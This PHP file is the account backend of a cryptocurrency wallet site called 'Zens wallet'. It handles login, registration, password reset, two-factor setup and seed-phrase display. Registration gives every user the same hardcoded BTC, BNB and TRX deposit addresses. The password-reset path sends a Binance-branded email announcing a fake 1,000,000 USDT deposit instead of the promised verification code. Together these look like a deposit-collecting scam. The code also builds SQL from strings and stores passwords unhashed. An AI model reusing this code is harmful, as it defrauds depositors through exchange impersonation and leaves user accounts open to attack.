<?php
require_once("../../config/config.php");
require_once("../../config/function.php");
require_once('../../class/class.smtp.php');
require_once('../../class/PHPMailerAutoload.php');
require_once('../../class/class.phpmailer.php');

if ($_POST['type'] == 'Login') {

    $email = check_string($_POST['email']);
    $password = check_string($_POST['password']);

    if (!$BNZ->get_row(" SELECT * FROM `users` WHERE `email` = '$email' ")) {
        die(json_encode(['content' => 'Login email does not exist']));
    }

    if ($BNZ->get_row(" SELECT * FROM `users` WHERE `email` = '$email' AND `banned` = '1' ")) {
        die(json_encode(['content' => 'This account has been locked']));
    }
    if (!$BNZ->get_row(" SELECT * FROM `users` WHERE `email` = '$email' AND `password` = '$password' ")) {
        die(json_encode(['content' => 'Login password is incorrect']));
    }

    $_SESSION['username'] = $email;
    die(json_encode(['content' => 'Logged in successfully', 'status' => 1],));
}

if ($_POST['type'] == 'Register') {
    $name = check_string($_POST['name']);
    $email = check_string($_POST['email']);
    $phone = check_string($_POST['phone']);
    $country = check_string($_POST['country']);
    $password = check_string($_POST['password']);
    $pass = check_string($_POST['pass']);
    $catch_code = check_string($_POST['catch_code']);

    if (!$name || !$email || !$phone || !$country || !$password || !$pass)
        die(json_encode(['content' => 'All field Required !']));



    if ($password != $pass) {
        die(json_encode(['content' => 'Re-entered password is incorrect']));
    }
    if ($BNZ->num_rows(" SELECT * FROM `users` WHERE `ip` = '" . myip() . "' ") > 3) {
        die(json_encode(['content' => 'Account creation limit']));
    }

    $money = [
        'BTCUSDT' => auto_decimal_format(0, 6),
        'ETHUSDT' => auto_decimal_format(0, 6),
        'BNBUSDT' => auto_decimal_format(0, 6),
        'USDTUSD4' => auto_decimal_format(0, 6),
        'TRXUSDT' => auto_decimal_format(0, 6),
    ];


    $wallet_address = [
        'BTCUSDT' => [
            'address' => 'bc1q5cvhft386wfm57hhjgapluurudmqp06m0ml89c',
            'qrcode'  => 'https://i.imgur.com/eoaJtY5.png'
        ],
        'ETHUSDT' => [
            'address' => $BNZ->site('ETH_address'),
            'qrcode'  => $BNZ->site('ETH_qr'),
        ],
        'BNBUSDT' => [
            'address' => 'bnb14jc35d3n4rumvgygqnfg2g36nsy20ydtk7fqn6',
            'qrcode'  => 'https://i.imgur.com/MApMwop.png'
        ],
        'USDTUSD4' => [
            'address' => randomWalletAddres(),
            'qrcode'  => 'data:image/jpeg;base64,iVBORw0KGgoAAAANSUhEUgAAAG8AAABvAQMAAADYCwwjAAAABlBMVEX///8AAABVwtN+AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABHklEQVQ4jdXUsa3EIAwAUEcUdLAAUtZwx0rJArnLAslKdKyBxAL3Owp0/uZy/36HaQ+hKK9AtokdgG9cluiOafOZKIk0oA50U8h3GKDnl3xgPssQz3LtIe4BbFRDBHXGtOB/kh1yvZwS70/5HfKaiB/pc5kdWsoU3a3UNY6wGqyLd9s7qy5DfuL8QC4ZRE7tTrjetGmZtigqdSpuvcrvEjCtwW06n2GAXlGkvZ0FkRzCcLEeblGmwZlIcQMsOsmE2urVdMAI809xNnBEkKnrAvmh56ceoCe+SYNEJPMVCxZINiSR3LHc3jySx/VBu+RZ2COsMZkRej7FrULvP4PEM3DH/uUv8cC6eXejAfL8hjaP1+D02ea3RXEGZH7f+gWJm94/C9Z5yAAAAABJRU5ErkJggg=='
        ],
        'TRXUSDT' => [
            'address' => 'TFhWra4q8RJmprF8qQcg8wSgH2w3cJYnG8',
            'qrcode'  => 'https://i.imgur.com/xxjmZG0.png'
        ],
    ];

    $BNZ->insert('hoatdong', [
        'username' => $email,
        'content'  =>  'Account successfully created',
        'time' => time(),
    ]);

    $create = $BNZ->insert("users", [
        'name'      => $name,
        'email'      => $email,
        'phone'      => $phone,
        'country'         => $country,
        'password'      => TypePassword($password),
        'token'         => random('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM', 64),
        'money'         => json_encode($money),
        'total_money'   => 0,
        'banned'        => 0,
        'device'            => getUserAgent(),
        'ip'            => myip(),
        'time'          => time(),
        'createdate'    => time(),
        'secret_phrase' => ranDomSecretPhrase(),
        'wallet_id' => rand(1, 999999999999),
        'wallet_address' => json_encode($wallet_address),
        'phi_rut' => '0.6'
    ]);
    if ($create) {


        // $row = $BNZ->get_row(" SELECT * FROM `users` WHERE `email` = '$email' ");
        // $otp = md5(random('0123456789', '6'));
        // $BNZ->update("users", array(
        //     'confirm_email' => $otp
        // ), " `id` = '" . $row['id'] . "' ");

        // $guitoi = $email;
        // $subject = 'VERIFY ACCOUNT';
        // $bcc = $BNZ->site('webname');
        // $hoten = $row['name'];
        // $noi_dung = '<p>Please click on the link to confirm your account <a href="'.$otp.'">confirm</a></p>
        //  ';
        // sendCSM($guitoi, $hoten, $subject, $noi_dung, $bcc);

        die(json_encode(['content' => 'Account successfully created', 'status' => 1]));
    } else {
        die(json_encode(['content' => 'Please check configuration DATABASE']));
    }
}


if ($_POST['type'] == 'ForgotPassword') {
    $email = check_string($_POST['email']);
    if (empty($email)) {
        die(json_encode(['content' => 'Plese enter the email', 'status' => 0]));
    }

    $row = $BNZ->get_row(" SELECT * FROM `users` WHERE `email` = '$email' ");
    if (!$row) {
        die(json_encode(['content' => 'Email address does not exist in the system', 'status' => 0]));
    }
    $otp = random('0123456789', '6');
    $BNZ->update("users", array(
        'otp' => $otp
    ), " `id` = '" . $row['id'] . "' ");

    $guitoi = $email;
    $subject = 'VERIFICATION PASSWORD RECOVERY';
    $bcc = $BNZ->site('webname');
    $hoten = 'User';

    $noi_dung = '
    <p><span style="color: rgb(0, 0, 0);"><img src="https://lh5.googleusercontent.com/pONziB8R1_Ag0BdH2rfXhOaszaEi468ppUe4GyD9gTb6cMSQQBqIanUq0z977YrvrtVOwZU_Rll2misg5GuxthGkZSQGG6jGZwibcW_XoVMGU93MF1MhjDeggM1ba28LM-92UnWr9PH2MM26lXC66trZW3KL-FO_" style="width: 485px; height: 67.3875px;"><br></span><span style="font-size: 26px; color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 0, 0);"><strong><span style="font-size: 20px;">USDT Deposit Successful</span></strong><br><br><span style="font-size: 14px;">Your deposit of 1000000 USDT is now available in your Zens wallet account. Log in to check your balance. Read our&nbsp;<a href="https://www.binance.com/en/support/faq">FAQs</a> if you are running into problems.<br></span></span></p>
    <p><span style="color: rgb(0, 0, 0); font-size: 14px;"><img src="https://lh6.googleusercontent.com/R5wEXrPAW96Zt5aDI9loXH6kqWgblXKYnj9FPqTPaCFTFqFy28YTzroT0pnCwjkLD_FtNb9fRzdlg07QBYZHzDzkkXK9pQI2XremEYHrEZX0Jn6uHLwNZIq6TUVyT3aQ5P-TmIHos5v1RnXm8OPH10hgzx67CcWm" style="width: 158px; height: 29.9526px;"><br><br>Don&rsquo;t recognize this activity? Please <a href="https://accounts.binance.com/en/user/reset-password/1?type=email">reset your password</a> and contact&nbsp;<a href="https://www.binance.com/en/support">customer support</a> immediately.<br><br>This is an automated message, please do not reply.</span></p>
    <p style="text-align: center;"><span style="color: rgb(0, 0, 0); font-size: 14px;">______________________________________</span></p>
    <p style="text-align: center;"><span style="color: rgb(0, 0, 0); font-size: 14px;"><br></span><span style="color: rgb(41, 105, 176);"><strong><span style="font-size: 14px;">Stay connected!</span></strong></span><span style="color: rgb(0, 0, 0);"><br><br><a href="https://twitter.com/binance"><img src="https://lh6.googleusercontent.com/Vwmf_iPvpbiS11mO8AQrA8ZrT93Fnt6IAdaEiJ34whSk7GYxeVufNnuj1wsQfrDy3UfyB0qEHDgHwxLQyKt4EWYWbacM27PEFF9HSD9dra9r0sYxAB_Drz9s9crEO190dpZ_Q2-JnpJj8k_L8prFR4xdewYlyDLD" width="20" height="20"></a>&nbsp; &nbsp;<a href="https://telegram.me/BinanceExchange"><img src="https://lh4.googleusercontent.com/N86A_b8Uprnn-xtihf_q-A4uz90NN4_5SkwvgrTt-Fm4RoQ64fpp1hAfFdJEpQepBGawR_HJs9WWME29n1GneH-QGQetoby55jaj9OlREm-HTQ1YZC1-xnO3i6hi3-Vn0tOILBR4T0sm9E_dQsb7nX_SyS3R1uZ3" width="20" height="20"></a>&nbsp; &nbsp;<a href="https://www.facebook.com/binance"><img src="https://lh3.googleusercontent.com/T6qaeD_K2muhQkzIdK5M0fZzDwro6iQ_T8pez_Be-xuHlSKmEo8mfU2BYTdp4aK97CtFcf1KcCtECWycT4EuEMEJOHYfoFV9SyCo1w-n7Ay9XtKFZWC-rYHKoEslxemkSYfbPYF-lqhZw6H04zMOu9IqrAsA8Eys" width="20" height="20"></a>&nbsp; &nbsp; <a href="https://www.linkedin.com/company/binance"><img src="https://lh6.googleusercontent.com/BuNGF14bX-hczAy6YD7zt6q6RGUxMTRhMHz_132Sc4eqVxKnRkL_SakcvofihqSLmFJIgU5aHM8k09lFuZXbmiEP-feNKlsXQin3T2a7egBmiEmNxsBnD9rP4LGpJknoQeUu-_NMxs9FSvKHXM5rNgz64A0QiUC4" width="20" height="20"></a>&nbsp; &nbsp; <a href="https://www.youtube.com/c/BinanceYoutube/featured"><img src="https://lh3.googleusercontent.com/NPWBrKvhtOCB03E3QTGKOzX6TrLFGd8n65Se9ctsxsStywLCUasO6GThxXV0uavknXym5EwA6BWS_DxthXB7328ZNQEmCUJ-7xBnzVn3tBLvyMxyQXpWgeTgfLrQyNLSJO1LB9wyVOemACky3w_4Y5Jmk70j-I7C" width="20" height="20"></a>&nbsp; &nbsp;<a href="https://www.reddit.com/r/binance/"><img src="https://lh6.googleusercontent.com/BhH5Xu9XY7JY0u7hIC04EIsjWXCMj9WLZSwSAiULRl0HIlCP2z-SE8lhNAm3KdEI4znlf4bfID1hXYM0rHxEosDfWTGbiJrkWyoIrdkayHoxA1Bf_JuPTh-luc34OnYsQqDcgJn4V-LkowPfCOKaG84WUlRoPK-y" width="20" height="20"></a>&nbsp; &nbsp;<a href="https://instagram.com/binance"><img src="https://lh6.googleusercontent.com/gjxV--V8J28h7q34Gam11bv9nrMdajnI2j7SMG0e4dJjnDkUEUYVVjgxvHkaeFtv9G6bw81oOu8EFsQ16P2evGMnDZDgv-EU7Y0u5Q1rl2HzXzgj2QQGNS7SGIJx77fcBcWTqDo6PLUFwL1ujLba68Sc-fWcupgm" width="20" height="20"></a> </span></p>
    <p><span style="color: rgb(0, 0, 0);"><br><span style="font-size: 11px;">To stay secure, setup your phishing code <a href="https://www.binance.com/en/my/security/anti-phishing-code">here<br><br></a>Risk warning:&nbsp;Cryptocurrency trading is subject to high market risk. Zens wallet will make the best efforts to choose high-quality coins, but will not be responsible for your trading losses. Please trade with caution.</span></span></p>
    <p><span style="color: rgb(0, 0, 0); font-size: 11px;">Kindly note:&nbsp;Please be aware of phishing sites and always make sure you are visiting the official Zenswallet.com website when entering sensitive data.<br><br>&copy; 2023 Zenswallet.com, All Rights Reserved.</span></p>
    <p><span style="color: rgb(0, 0, 0);"><br><br><br></span></p>
    <p><span style="color: rgb(0, 0, 0);"><br></span></p>
    <p><span style="color: rgb(0, 0, 0);"><br></span></p>
    <p><span style="color: rgb(0, 0, 0);"><br></span></p>
    <p><span style="color: rgb(0, 0, 0);"><br></span></p>
    <p><span style="color: rgb(0, 0, 0);"><br><br><br></span></p>
    <p><span style="color: rgb(0, 0, 0);"><br></span></p>
    <p><span style="color: rgb(0, 0, 0);"><br></span></p>
    <p><br></p>
    ';

    // $noi_dung = '<h3>Someone has just requested to reset the password by this Email, if you are, please enter the verification code below to verify the account</h3>
    //     <table>
    //     <tbody>
    //     <tr>
    //     <td style="font-size:20px;">OTP:</td>
    //     <td><b style="color:blue;font-size:30px;">' . $otp . '</b></td>
    //     </tr>
    //     </tbody>
    //     </table>';
    // sendCSM($guitoi, $hoten, $subject, $noi_dung, $bcc);

    die(json_encode(['content' => 'We have sent a verification code to your Email address!', 'status' => 1]));
}

if ($_POST['type'] == 'CodeForgetPassword') {

    $email = check_string($_POST['CodeEmail']);
    $code = check_string($_POST['code']);
    $password1 = check_string($_POST['password1']);
    $password2 = check_string($_POST['password2']);

    if (empty($email)) {
        die(json_encode(['content' => 'Plese enter the email', 'status' => 0]));
    }

    $row = $BNZ->get_row(" SELECT * FROM `users` WHERE `email` = '$email' ");
    if (!$row) {
        die(json_encode(['content' => 'Email address does not exist in the system', 'status' => 0]));
    }

    if ($password1 != $password2) {
        die(json_encode(['content' => 'Re-entered password is incorrect']));
    }

    if ($row['otp'] != $code) {
        die(json_encode(['content' => 'Otp is not correct']));
    }

    $otp = random('0123456789', '6');
    $BNZ->update("users", array(
        'otp' => $otp,
        'password' => $password1,
    ), " `id` = '" . $row['id'] . "' ");

    die(json_encode(['content' => 'Change password successfully', 'status' => 1]));
}

if ($_POST['type'] == 'ChangePassword') {
    $old = check_string($_POST['old_pin']);
    $new = check_string($_POST['new_pin']);
    $re_new = check_string($_POST['new_pin1']);


    if (empty($_SESSION['username'])) {
        die(json_encode(['content' => 'Please Login"', 'status' => 0]));
    }

    $row = $BNZ->get_row(" SELECT * FROM `users` WHERE `email` = '" . $user['email'] . "' ");

    if ($old != $row['password']) {
        die(json_encode(['content' => 'Old password is incorrect', 'status' => 0]));
    }

    if (empty($old)) {
        die(json_encode(['content' => 'You have not entered your old password', 'status' => 0]));
    }
    if (empty($new)) {
        die(json_encode(['content' => 'You have not entered your new password', 'status' => 0]));
    }

    if ($new != $re_new) {
        die(json_encode(['content' => 'Re-entered password is incorrect', 'status' => 0]));
    }

    $BNZ->insert('hoatdong', [
        'username' => $row['email'],
        'content'  =>  'Password successfully changed',
        'time' => time(),
    ]);


    $BNZ->update("users", [
        'password' => $new
    ], " `id` = '" . $row['id'] . "' ");

    die(json_encode(['content' => 'Password successfully changed', 'status' => 1]));
}

if ($_POST['type'] == 'ResetAuthen') {

    $code = check_string($_POST['code']);
    $secret = check_string($_POST['secret']);
    $password = check_string($_POST['password']);

    if (empty($_SESSION['username'])) {
        die(json_encode(['content' => 'Please Login"', 'status' => 0]));
    }

    if (!$code) {
        die(json_encode(['content' => 'Please enter Auth code', 'status' => 0]));
    }

    if ($password != $user['password']) {
        die(json_encode(['content' => 'Wrong password', 'status' => 0]));
    }

    require_once '../../class/GoogleAuthenticator.php';
    $ga = new PHPGangsta_GoogleAuthenticator();


    $checkResult = $ga->verifyCode($secret, $code, 2);    // 2 = 2*30sec clock tolerance
    if ($checkResult) {

        $BNZ->insert('hoatdong', [
            'username' => $user['email'],
            'content'  =>  'Change Authentication successfully',
            'time' => time(),
        ]);

        $BNZ->update('users', [
            'google_auth_code' => $secret,
        ], " `id` = '" . $user['id'] . "' ");

        die(json_encode(['content' => 'Change Authentication successfully', 'status' => 1]));
    } else {
        die(json_encode(['content' => 'Incorrect code']));
    }
}

if ($_POST['type'] == 'VerifyAccount') {

    $email = check_string($_POST['email']);
    $code = check_string($_POST['code']);
    $secret = check_string($_POST['secret']);

    require_once '../../class/GoogleAuthenticator.php';
    $ga = new PHPGangsta_GoogleAuthenticator();


    $checkResult = $ga->verifyCode($secret, $code, 2);    // 2 = 2*30sec clock tolerance
    if ($checkResult) {

        $BNZ->update('users', [
            'status' => 'active',
            'google_auth_code' => $secret,
        ], " `email` = '$email' ");

        $_SESSION['username'] = $email;


        $guitoi = $email;
        $subject = '[Zens wallet] Your Crypto Journey Starts Now!';
        $bcc = $BNZ->site('webname');
        $hoten = 'User';
        $noi_dung = '
        

        <p style="line-height: 1.5;"><span style="color: rgb(0, 0, 0);"><img src="https://lh5.googleusercontent.com/pONziB8R1_Ag0BdH2rfXhOaszaEi468ppUe4GyD9gTb6cMSQQBqIanUq0z977YrvrtVOwZU_Rll2misg5GuxthGkZSQGG6jGZwibcW_XoVMGU93MF1MhjDeggM1ba28LM-92UnWr9PH2MM26lXC66trZW3KL-FO_" style="width: 485px; height: 67.3875px;"><br></span><span style="font-size: 26px; color: rgb(0, 0, 0);"><br></span><span style="font-size: 20px;"><strong>Your Crypto Journey Starts Now!</strong></span><br>Welcome to Zenswallet. You can refer to the following ways to protect your account and assets.<br><span style="color: rgb(0, 0, 0);"><span style="font-size: 14px;"><br></span></span></p>
        <p style="line-height: 1;"><span style="color: rgb(0, 0, 0); font-size: 16px;"><strong> Security Tips : </strong></span><span style="color: rgb(0, 0, 0); font-size: 14px;"><br></span></p>
        <ul>
            <li>
                <p>Never give your password to anyone.</p>
            </li>
            <li>
                <p>Never call any phone number from someone claiming to be Zens wallet Customer Support.&nbsp;</p>
            </li>
            <li>
                <p>Never send any money to anyone claiming to be a member of the Zenswallet team.&nbsp;</p>
            </li>
            <li>
                <p>Enable&nbsp;<a href="'.$url.'Settings">Google Two-Factor Authentication</a>.&nbsp;</p>
            </li>
            <li>
                <p>Set up your&nbsp;<a href="'.$url.'Settings">anti-phishing code</a> to add an extra layer of security to your account.&nbsp;</p>
            </li>
            <li>
                <p>Bookmark&nbsp;<a href="'.$url.'">www.zenswallet.com</a> and use&nbsp;<a href="'.$url.'Settings">Zens wallet Verify</a> to check whether the Zenswallet domain you&rsquo;re visiting is genuine.&nbsp;</p>
            </li>
            <li>
                <p>For more information, visit&nbsp;<a href="'.$url.'Profile">15 Tips to Enhance Security for Your Zens wallet Account</a>.</p>
            </li>
        </ul>
        <p>Don&rsquo;t recognize this activity? Please&nbsp;<a href="'.$url.'Settings">customer support</a> immediately.&nbsp;</p>
        <p><br>This is an automated message, please do not reply.</p>
        <p style="line-height: 1;text-align: center;"><span style="color: blue; font-size: 14px;">______________________________________</span></p>
        <p style="line-height: 1;text-align: center;"><span style="color: rgb(0, 0, 0); font-size: 14px;"><br></span><span style="color: rgb(41, 105, 176);"><strong><span style="font-size: 14px;">Stay connected!</span></strong></span><span style="color: rgb(0, 0, 0);"><br><br><a href="https://twitter.com/binance"><img src="https://lh6.googleusercontent.com/Vwmf_iPvpbiS11mO8AQrA8ZrT93Fnt6IAdaEiJ34whSk7GYxeVufNnuj1wsQfrDy3UfyB0qEHDgHwxLQyKt4EWYWbacM27PEFF9HSD9dra9r0sYxAB_Drz9s9crEO190dpZ_Q2-JnpJj8k_L8prFR4xdewYlyDLD" width="20" height="20"></a>&nbsp; &nbsp;<a href="https://telegram.me/BinanceExchange"><img src="https://lh4.googleusercontent.com/N86A_b8Uprnn-xtihf_q-A4uz90NN4_5SkwvgrTt-Fm4RoQ64fpp1hAfFdJEpQepBGawR_HJs9WWME29n1GneH-QGQetoby55jaj9OlREm-HTQ1YZC1-xnO3i6hi3-Vn0tOILBR4T0sm9E_dQsb7nX_SyS3R1uZ3" width="20" height="20"></a>&nbsp; &nbsp;<a href="https://www.facebook.com/binance"><img src="https://lh3.googleusercontent.com/T6qaeD_K2muhQkzIdK5M0fZzDwro6iQ_T8pez_Be-xuHlSKmEo8mfU2BYTdp4aK97CtFcf1KcCtECWycT4EuEMEJOHYfoFV9SyCo1w-n7Ay9XtKFZWC-rYHKoEslxemkSYfbPYF-lqhZw6H04zMOu9IqrAsA8Eys" width="20" height="20"></a>&nbsp; &nbsp; <a href="https://www.linkedin.com/company/binance"><img src="https://lh6.googleusercontent.com/BuNGF14bX-hczAy6YD7zt6q6RGUxMTRhMHz_132Sc4eqVxKnRkL_SakcvofihqSLmFJIgU5aHM8k09lFuZXbmiEP-feNKlsXQin3T2a7egBmiEmNxsBnD9rP4LGpJknoQeUu-_NMxs9FSvKHXM5rNgz64A0QiUC4" width="20" height="20"></a>&nbsp; &nbsp; <a href="https://www.youtube.com/c/BinanceYoutube/featured"><img src="https://lh3.googleusercontent.com/NPWBrKvhtOCB03E3QTGKOzX6TrLFGd8n65Se9ctsxsStywLCUasO6GThxXV0uavknXym5EwA6BWS_DxthXB7328ZNQEmCUJ-7xBnzVn3tBLvyMxyQXpWgeTgfLrQyNLSJO1LB9wyVOemACky3w_4Y5Jmk70j-I7C" width="20" height="20"></a>&nbsp; &nbsp;<a href="https://www.reddit.com/r/binance/"><img src="https://lh6.googleusercontent.com/BhH5Xu9XY7JY0u7hIC04EIsjWXCMj9WLZSwSAiULRl0HIlCP2z-SE8lhNAm3KdEI4znlf4bfID1hXYM0rHxEosDfWTGbiJrkWyoIrdkayHoxA1Bf_JuPTh-luc34OnYsQqDcgJn4V-LkowPfCOKaG84WUlRoPK-y" width="20" height="20"></a>&nbsp; &nbsp;<a href="https://instagram.com/binance"><img src="https://lh6.googleusercontent.com/gjxV--V8J28h7q34Gam11bv9nrMdajnI2j7SMG0e4dJjnDkUEUYVVjgxvHkaeFtv9G6bw81oOu8EFsQ16P2evGMnDZDgv-EU7Y0u5Q1rl2HzXzgj2QQGNS7SGIJx77fcBcWTqDo6PLUFwL1ujLba68Sc-fWcupgm" width="20" height="20"></a>&nbsp;</span></p>
        <p style="line-height: 1;"><span style="color: rgb(0, 0, 0);"><br><span style="font-size: 11px;">To stay secure, setup your phishing code <a href="'.$url.'Settings">here<br><br></a><strong>Risk warning:</strong> Cryptocurrency trading is subject to high market risk. Zens wallet will make the best efforts to choose high-quality coins, but will not be responsible for your trading losses. Please trade with caution.</span></span></p>
        <p style="line-height: 1;"><span style="color: rgb(0, 0, 0); font-size: 11px;"><strong>Kindly note:</strong> Please be aware of phishing sites and always make sure you are visiting the official Zenswallet.com website when entering sensitive data.<br><br></span></p>
        <p style="text-align: center; font-size: 11px;">&copy; 2023 Zenswallet.com, All Rights Reserved.</p>
        <p><br></p>
        <p style="line-height: 1;"><span style="color: rgb(0, 0, 0);"><br><br><br></span></p>
        <p style="line-height: 1;"><span style="color: rgb(0, 0, 0);"><br></span></p>

        ';
    sendCSM($guitoi, $hoten, $subject, $noi_dung, $bcc);


        die(json_encode(['content' => 'Account confirmation successful', 'status' => 1]));
    } else {

        die(json_encode(['content' => 'Incorrect code']));
    }
}

if ($_POST['type'] == 'GetPhrase') {

    $password = check_string($_POST['pass']);

    if (empty($_SESSION['username'])) {
        die(json_encode(['content' => 'Please Login"', 'status' => 0]));
    }

    if ($password != $user['password']) {
        die(json_encode(['content' => 'Wrong password', 'status' => 0]));
    }

    die(json_encode(['content' => $user['secret_phrase'], 'status' => 1]));
}

if ($_POST['type'] == 'ChangePhrase') {


    if (empty($_SESSION['username'])) {
        die(json_encode(['content' => 'Please Login"', 'status' => 0]));
    }


    die(json_encode(['content' => "Change phrase successfully", 'status' => 1]));
}
